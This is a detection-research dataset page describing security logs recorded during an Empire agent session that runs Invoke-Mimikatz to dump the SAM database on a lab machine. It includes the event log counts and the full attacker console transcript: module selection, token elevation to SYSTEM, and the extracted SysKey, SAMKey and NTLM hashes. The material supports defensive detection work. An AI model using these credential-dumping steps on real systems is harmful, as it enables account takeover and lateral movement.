# Empire Mimikatz Lsadump SAM

PowerSploit's Invoke-Mimikatz function to extract hashes from the Security Account Managers (SAM) database

## Technique(s) ID

T1003

## Creators

Roberto Rodriguez [@Cyb3rWard0g](https://twitter.com/Cyb3rWard0g)

## Dataset

[empire_mimikatz_lsadump_sam.tar.gz](./empire_mimikatz_lsadump_sam.tar.gz)

## Network Environment

Shire

## Time Taken

2019-06-25103712

## About this file

| log_name                                                           | source_name                                            | task                                                   |   record_number |
|--------------------------------------------------------------------|--------------------------------------------------------|--------------------------------------------------------|-----------------|
| Windows PowerShell                                                 | PowerShell                                             | Pipeline Execution Details                             |            2432 |
| Windows PowerShell                                                 | PowerShell                                             | Provider Lifecycle                                     |               8 |
| Windows PowerShell                                                 | PowerShell                                             | Engine Lifecycle                                       |               1 |
| System                                                             | Service Control Manager                                | na                                                     |               7 |
| System                                                             | Microsoft-Windows-Kernel-General                       | na                                                     |               1 |
| Security                                                           | Microsoft-Windows-Security-Auditing                    | Filtering Platform Connection                          |             405 |
| Security                                                           | Microsoft-Windows-Security-Auditing                    | Token Right Adjusted Events                            |             294 |
| Security                                                           | Microsoft-Windows-Security-Auditing                    | Removable Storage                                      |             179 |
| Security                                                           | Microsoft-Windows-Security-Auditing                    | Registry                                               |             175 |
| Security                                                           | Microsoft-Windows-Security-Auditing                    | Handle Manipulation                                    |              99 |
| Security                                                           | Microsoft-Windows-Security-Auditing                    | Sensitive Privilege Use                                |              43 |
| Security                                                           | Microsoft-Windows-Security-Auditing                    | Other Object Access Events                             |              39 |
| Security                                                           | Microsoft-Windows-Security-Auditing                    | SAM                                                    |              36 |
| Security                                                           | Microsoft-Windows-Security-Auditing                    | Process Creation                                       |              32 |
| Security                                                           | Microsoft-Windows-Security-Auditing                    | Process Termination                                    |              23 |
| Security                                                           | Microsoft-Windows-Security-Auditing                    | Group Membership                                       |              20 |
| Security                                                           | Microsoft-Windows-Security-Auditing                    | Logon                                                  |              20 |
| Security                                                           | Microsoft-Windows-Security-Auditing                    | Special Logon                                          |              18 |
| Security                                                           | Microsoft-Windows-Security-Auditing                    | Authorization Policy Change                            |              15 |
| Security                                                           | Microsoft-Windows-Security-Auditing                    | Detailed File Share                                    |              14 |
| Security                                                           | Microsoft-Windows-Security-Auditing                    | Logoff                                                 |              13 |
| Security                                                           | Microsoft-Windows-Security-Auditing                    | Other Policy Change Events                             |               8 |
| Security                                                           | Microsoft-Windows-Security-Auditing                    | File System                                            |               4 |
| Security                                                           | Microsoft-Windows-Security-Auditing                    | File Share                                             |               2 |
| Security                                                           | Microsoft-Windows-Security-Auditing                    | Other Logon/Logoff Events                              |               2 |
| Microsoft-Windows-WMI-Activity/Operational                         | Microsoft-Windows-WMI-Activity                         | na                                                     |               3 |
| Microsoft-Windows-TerminalServices-LocalSessionManager/Operational | Microsoft-Windows-TerminalServices-LocalSessionManager | na                                                     |               4 |
| Microsoft-Windows-Sysmon/Operational                               | Microsoft-Windows-Sysmon                               | Process accessed (rule: ProcessAccess)                 |           32927 |
| Microsoft-Windows-Sysmon/Operational                               | Microsoft-Windows-Sysmon                               | Image loaded (rule: ImageLoad)                         |            1485 |
| Microsoft-Windows-Sysmon/Operational                               | Microsoft-Windows-Sysmon                               | Registry object added or deleted (rule: RegistryEvent) |            1002 |
| Microsoft-Windows-Sysmon/Operational                               | Microsoft-Windows-Sysmon                               | File created (rule: FileCreate)                        |             405 |
| Microsoft-Windows-Sysmon/Operational                               | Microsoft-Windows-Sysmon                               | Registry value set (rule: RegistryEvent)               |             273 |
| Microsoft-Windows-Sysmon/Operational                               | Microsoft-Windows-Sysmon                               | Network connection detected (rule: NetworkConnect)     |             181 |
| Microsoft-Windows-Sysmon/Operational                               | Microsoft-Windows-Sysmon                               | Pipe Connected (rule: PipeEvent)                       |              77 |
| Microsoft-Windows-Sysmon/Operational                               | Microsoft-Windows-Sysmon                               | RawAccessRead detected (rule: RawAccessRead)           |              48 |
| Microsoft-Windows-Sysmon/Operational                               | Microsoft-Windows-Sysmon                               | File creation time changed (rule: FileCreateTime)      |              47 |
| Microsoft-Windows-Sysmon/Operational                               | Microsoft-Windows-Sysmon                               | Process Create (rule: ProcessCreate)                   |              27 |
| Microsoft-Windows-Sysmon/Operational                               | Microsoft-Windows-Sysmon                               | Process terminated (rule: ProcessTerminate)            |              19 |
| Microsoft-Windows-Sysmon/Operational                               | Microsoft-Windows-Sysmon                               | Pipe Created (rule: PipeEvent)                         |               2 |
| Microsoft-Windows-PowerShell/Operational                           | Microsoft-Windows-PowerShell                           | Executing Pipeline                                     |            2764 |

## Attacker Activity

```
(Empire: Y298VW3B) > usemodule credentials/mimikatz/sam*
(Empire: powershell/credentials/mimikatz/sam) > info

              Name: Invoke-Mimikatz SAM dump
            Module: powershell/credentials/mimikatz/sam
        NeedsAdmin: True
         OpsecSafe: True
          Language: powershell
MinLanguageVersion: 2
        Background: True
   OutputExtension: None

Authors:
  @JosephBialek
  @gentilkiwi

Description:
  Runs PowerSploit's Invoke-Mimikatz function to extract
  hashes from the Security Account Managers (SAM) database.

Comments:
  http://clymb3r.wordpress.com/ http://blog.gentilkiwi.com htt
  ps://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump#ls
  a

Options:

  Name  Required    Value                     Description
  ----  --------    -------                   -----------
  Agent True        Y298VW3B                  Agent to run module on.                 

(Empire: powershell/credentials/mimikatz/sam) > execute
[*] Tasked Y298VW3B to run TASK_CMD_JOB
[*] Agent Y298VW3B tasked with task ID 3
[*] Tasked agent Y298VW3B to run module powershell/credentials/mimikatz/sam
(Empire: powershell/credentials/mimikatz/sam) > Job started: DV6AHB
Hostname: HR001.shire.com / S-1-5-21-2511471446-1103646877-3980648787

  .#####.   mimikatz 2.1.1 (x64) #17763 Feb 23 2019 12:03:02
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # token::elevate
Token Id  : 0
User name : 
SID name  : NT AUTHORITY\SYSTEM

512	{0;000003e7} 1 D 36238     	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Primary
 -> Impersonated !
 * Process Token : {0;000b8e62} 1 F 83841234  	SHIRE\nmartha	S-1-5-21-2511471446-1103646877-3980648787-1106	(12g,23p)	Primary
 * Thread Token  : {0;000003e7} 1 D 85913723  	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,21p)	Impersonation (Delegation)

mimikatz(powershell) # lsadump::sam
Domain : HR001
SysKey : c7bc124448d3851819e68f8c2c199c2f
Local SID : S-1-5-21-3594478387-3513325568-2589039918

SAMKey : 8b66c564e175f6a7c0c40bc70f65144f

RID  : 000001f4 (500)
User : Administrator

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 63a935cccb1d1be6c4011ec2a68f1a95

RID  : 000003e9 (1001)
User : Nora
  Hash NTLM: f9558f5eff6314996c96ec2c3800d3f0

mimikatz(powershell) # token::revert
 * Process Token : {0;000b8e62} 1 F 83841234  	SHIRE\nmartha	S-1-5-21-2511471446-1103646877-3980648787-1106	(12g,23p)	Primary
 * Thread Token  : no token



(Empire: powershell/credentials/mimikatz/sam) > 
```